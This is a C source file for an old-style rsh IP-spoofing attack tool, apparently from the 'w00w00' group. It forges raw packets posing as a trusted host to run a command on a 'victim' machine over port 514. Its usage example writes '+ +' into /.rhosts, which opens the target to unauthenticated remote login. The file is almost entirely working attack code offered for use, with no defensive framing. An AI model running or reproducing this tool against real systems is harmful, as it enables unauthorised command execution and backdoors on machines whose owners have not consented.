/* w00w00! */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include "spoof.c"

#define ERROR -1

unsigned long int host2ip(char *serv)
{
  struct hostent     *hent;
  struct sockaddr_in sinn;
      
  if ((hent = gethostbyname(serv)) == NULL) {
	perror("gethostbyname");
	exit(ERROR);
  }

  bzero((char *)&sinn, sizeof(sinn));
  bcopy(hent->h_addr, (char *)&sinn.sin_addr, hent->h_length);
  return sinn.sin_addr.s_addr;
}
 
                     
void main(int argc, char **argv)
{       	                
	 
  int i = 1;
  int s, s_r;
  char  *cmdptr;
  char  cmd[512];

  u_int sport;

  unsigned int port=514;
  unsigned long s_ip, d_ip, da_ip;
  
  printf("w00w00!\n");
   
  if (argc < 2) {
     printf(" %s [ips] [ipd] [ipl] [ps] [luser] [ruser] [cmd]  \n\n", argv[0]);
     printf(" Parameters List : \n");
     printf(" ips   =   ip source (ip of the trusted host)\n");
     printf(" ipd   =   ip destination (ip of the victim)\n");
     printf(" ipl   =   ip local (your ip to receive the informations)\n");
     printf(" ps    =   port source (between 0 and 1024)\n");
     printf(" luser =   local user\n");
     printf(" ruser =   remote user\n");
     printf(" cmd   =   command to execute\n\n");
     printf(" If ya don't understand, this is an example :\n\n");
     printf(" %s a.foo.us b.foo.us ppp.bad.org 1000 root root "
            "\"echo\\\"+ +\\\">/.rhosts\"\n\n", argv[0]); 

     exit(ERROR);
  }
    
    
  memset(cmd, 0, 512);
   

	
  if ((s_r = socket(AF_INET,SOCK_RAW, 6)) == ERROR) {
	perror("socket");
	exit(ERROR);
  }
  	
  if ((s = socket(AF_INET, SOCK_RAW, 255)) == ERROR) {
	perror("socket");
	close(s_r);
	exit(ERROR);
  }	
     
  #ifdef IP_HDRINCL
  if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i)) == ERROR) {
	close(s_r);
	close(s);
	exit(ERROR); 
  }
  #endif
	 
  d_ip  = host2ip(argv[2]);
  s_ip  = host2ip(argv[1]);
  da_ip = host2ip(argv[3]);         
  sport = atoi(argv[4]);


  cmdptr = cmd;
  strcat(cmdptr, "0\0");

  cmdptr = cmdptr + 2;
  strcat(cmdptr, argv[5]);

  cmdptr=cmdptr + strlen(argv[5]) + 1;
  strcat(cmdptr, argv[6]);

  cmdptr=cmdptr + strlen(argv[6]) + 1;
  strcat(cmdptr, argv[7]);

  cmdptr=cmdptr + strlen(argv[7]) + 1;
         
  Sconnect(s, s_ip, d_ip, sport, port, da_ip);
  Swrite(s, cmd, strlen(argv[5]) + strlen(argv[6]) + strlen(argv[7]) + 2 + 3);
  Srst(s); 

}
  
